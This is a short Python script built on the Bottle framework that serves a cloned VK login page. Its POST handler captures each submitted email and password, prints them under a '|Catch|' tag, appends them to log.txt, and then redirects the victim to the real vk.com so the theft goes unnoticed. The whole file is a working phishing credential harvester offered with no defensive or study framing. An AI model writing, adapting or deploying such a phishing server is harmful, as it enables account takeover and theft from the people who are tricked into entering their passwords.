#! coding:utf-8
from bottle import route,run,template,static_file,abort,get,post,redirect,request, response

@route('/')
def index():
    return template('vk2.html')

@route('/Welcome! | VK_files/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root='./Welcome! | VK_files/')

@post('/')
def index():
    login = request.forms.get('email')
    password = request.forms.get('pass')
    print "|Catch|-------------- " + login + ':' + password

    with open("log.txt", "a") as myfile:
        myfile.write(login + ':' + password + "\n")
    
    return redirect('http://www.vk.com')


@route('/images/<filepath:path>')
def server_static(filepath):
    return static_file(filepath, root='./images/')



run(host='localhost', port=8080, debug=True)

